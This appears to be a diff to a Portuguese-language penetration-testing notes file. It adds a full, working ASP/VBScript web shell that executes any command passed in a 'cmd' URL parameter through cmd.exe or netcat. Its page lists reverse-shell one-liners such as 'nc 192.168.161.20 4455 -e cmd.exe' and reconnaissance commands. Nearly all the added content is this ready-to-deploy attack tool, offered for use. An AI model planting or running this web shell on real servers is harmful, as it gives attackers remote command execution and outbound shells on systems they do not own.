@@ -5922,6 +5922,104 @@ WEB Shell em asp mais interativa
 	</body>
 	</html>
 
+.
+
+WEB Shell em asp mais interativa
+
+.
+
+	<%@ Language="VBScript" %>
+	<%
+	' Função para decodificar URL (para comandos com espaços)
+	Function URLDecode(sText)
+	    sText = Replace(sText, "+", " ")
+	    Dim i, pos, decoded
+	    i = 1
+	    Do While i <= Len(sText)
+	        If Mid(sText, i, 1) = "%" And i + 2 <= Len(sText) Then
+	            decoded = decoded & Chr(CLng("&H" & Mid(sText, i + 1, 2)))
+	            i = i + 3
+	        Else
+	            decoded = decoded & Mid(sText, i, 1)
+	            i = i + 1
+	        End If
+	    Loop
+	    URLDecode = decoded
+	End Function
+	
+	' Processar comando
+	Dim cmd, output
+	cmd = Request.QueryString("cmd")
+	
+	If cmd <> "" Then
+	    cmd = URLDecode(cmd)
+	    
+	    ' Executar comando
+	    On Error Resume Next
+	    Dim ws, exec
+	    Set ws = Server.CreateObject("WScript.Shell")
+	    
+	    ' Verificar se é um comando do netcat (começa com "nc ")
+	    If LCase(Left(cmd, 3)) = "nc " Then
+	        ' Executar nc.exe diretamente (assumindo que está no mesmo diretório)
+	        Set exec = ws.Exec("nc.exe " & Mid(cmd, 4))
+	    Else
+	        ' Executar comando normal via cmd.exe
+	        Set exec = ws.Exec("cmd.exe /c " & cmd)
+	    End If
+	    
+	    If Err.Number <> 0 Then
+	        output = "Erro: " & Err.Description
+	    Else
+	        output = exec.StdOut.ReadAll()
+	        If output = "" Then output = exec.StdErr.ReadAll()
+	        If output = "" Then output = "Comando executado (sem saída)"
+	    End If
+	End If
+	%>
+	
+	<html>
+	<head>
+	<title>Webshell ASP com Netcat</title>
+	<style>
+	body { font-family: Arial; margin: 20px; background: #f5f5f5; }
+	pre { background: #fff; padding: 15px; border: 1px solid #ddd; }
+	form { background: #fff; padding: 20px; border: 1px solid #ddd; }
+	input[type="text"] { width: 70%; padding: 8px; }
+	input[type="submit"] { padding: 8px 15px; background: #4CAF50; color: white; border: none; }
+	</style>
+	</head>
+	<body>
+	<h2>Webshell ASP com Netcat</h2>
+	
+	<form method="GET">
+	  Comando: 
+	  <input type="text" name="cmd" placeholder="Ex: nc 192.168.1.100 4444 -e cmd.exe" value="<%= Server.HTMLEncode(cmd) %>">
+	  <input type="submit" value="Executar">
+	</form>
+	
+	<% If cmd <> "" Then %>
+	<h3>Comando executado:</h3>
+	<pre><%= Server.HTMLEncode(cmd) %></pre>
+	
+	<h3>Resultado:</h3>
+	<pre><%= Server.HTMLEncode(output) %></pre>
+	<% End If %>
+	
+	<h3>Exemplos de uso do Netcat:</h3>
+	<ul>
+	  <li><code>nc 192.168.161.20 4455 -e cmd.exe</code> - Shell reversa</li>
+	  <li><code>nc -lvp 4444</code> - Ouvir em uma porta (se suportado)</li>
+	</ul>
+	
+	<h3>Outros comandos úteis:</h3>
+	<ul>
+	  <li><code>dir</code> - Listar arquivos</li>
+	  <li><code>whoami</code> - Ver usuário atual</li>
+	  <li><code>ipconfig</code> - Configuração de rede</li>
+	</ul>
+	</body>
+	</html>
 
 - INFORMATION GATHERING
 
